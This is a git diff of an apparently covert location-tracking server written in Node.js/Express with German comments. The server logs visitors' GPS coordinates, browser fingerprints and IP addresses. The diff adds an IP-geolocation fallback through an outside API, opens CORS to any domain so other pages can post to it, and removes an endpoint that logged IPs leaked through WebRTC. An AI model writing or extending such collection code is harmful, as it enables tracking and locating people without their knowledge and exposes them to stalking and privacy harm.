@@ -1,3 +1,5 @@
+const cors = require('cors');
+
 const express = require('express');
 const bodyParser = require('body-parser');
 const path = require('path');
@@ -31,6 +33,9 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const LOG_DIR = path.join(__dirname, 'logs');
 
+// 🔥 2. CORS aktivieren (VOR ALLEN MIDDLEWARES)
+app.use(cors()); // ⚠️ Für Produktion: app.use(cors({ origin: 'https://deine-domain.com' }))
+
 if (!fs.existsSync(LOG_DIR)) {
     fs.mkdirSync(LOG_DIR);
 }
@@ -50,25 +55,41 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static('public'));
 
-// 📌 HAUPT-ENDPOINT FÜR STANDORTDATEN
+// 📌 3. ANGEPASSTER /submit-ENDPOINT (MIT IP-FALLBACK)
 app.post('/submit', limiter, async (req, res) => {
     try {
-        const { latitude, longitude, method, fingerprint, extra } = req.body;
-        
+        let { latitude, longitude, method, fingerprint, extra } = req.body;
+        const ip = req.headers['x-real-ip'] || req.ip;
+
+        // 💀 IP-Geolocation als Fallback (wenn GPS fehlt)
+        if ((!latitude || !longitude) && ip) {
+            try {
+                const ipData = await fetch(`https://ipapi.co/${ip}/json`).then(res => res.json());
+                if (ipData.latitude && ipData.longitude) {
+                    latitude = latitude || ipData.latitude;
+                    longitude = longitude || ipData.longitude;
+                    method = method ? `${method}+IP_FALLBACK` : 'IP_FALLBACK';
+                    console.log('🌐 IP-Geolocation genutzt:', ipData.city);
+                }
+            } catch (ipError) {
+                console.error('❌ IP-API Fehler:', ipError);
+            }
+        }
+
         const trackingData = {
             timestamp: new Date().toISOString(),
-            ip: req.headers['x-forwarded-for'] || req.ip,
+            ip: ip,
             userAgent: req.headers['user-agent'],
             method: method || 'UNKNOWN',
             coordinates: latitude && longitude ? {
                 lat: parseFloat(latitude).toFixed(6),
                 lng: parseFloat(longitude).toFixed(6),
-                accuracy: extra?.accuracy || null
+                accuracy: extra?.accuracy || (method?.includes('IP') ? 5000 : null) // ⚠️ IP = 5km Genauigkeit
             } : null,
             fingerprint: fingerprint || null
         };
 
-        console.log('📡 EMPFANGENE DATEN:', trackingData);
+        console.log('📡 EMPFANGENE DATEN:', trackingData.method, trackingData.coordinates);
 
         fs.appendFileSync(
             path.join(LOG_DIR, 'tracking.log'),
@@ -85,29 +106,6 @@ app.post('/submit', limiter, async (req, res) => {
         res.sendStatus(200);
     } catch (error) {
         console.error('❌ FEHLER:', error.message, req.body);
-        res.status(500).json({ error: "Internal server error" });
-    }
-});
-
-// 📍 ENDPOINT FÜR IP-LEAKS (WEBRTC)
-app.post('/submit-ip', limiter, (req, res) => {
-    try {
-        const { ip, type } = req.body;
-        const logEntry = {
-            timestamp: new Date().toISOString(),
-            ip: ip,
-            type: type || "webrtc",
-            userAgent: req.headers['user-agent']
-        };
-
-        fs.appendFileSync(
-            path.join(LOG_DIR, 'ip-leaks.log'),
-            JSON.stringify(logEntry) + '\n'
-        );
-
-        res.sendStatus(200);
-    } catch (error) {
-        console.error('❌ IP-LEAK-FEHLER:', error);
         res.status(500).json({ error: "Internal server error" });
     }
 });
@@ -147,4 +145,5 @@ app.get('/download-logs', (req, res) => {
 app.listen(PORT, () => {
     console.log(`🚀 Server läuft auf Port ${PORT}`);
     console.log(`🔑 Encryption-Key: ${ENCRYPTION_KEY?.slice(0, 6)}...`);
+    console.log('⚠️ CORS aktiviert für alle Domains (in Produktion einschränken!)');
 });
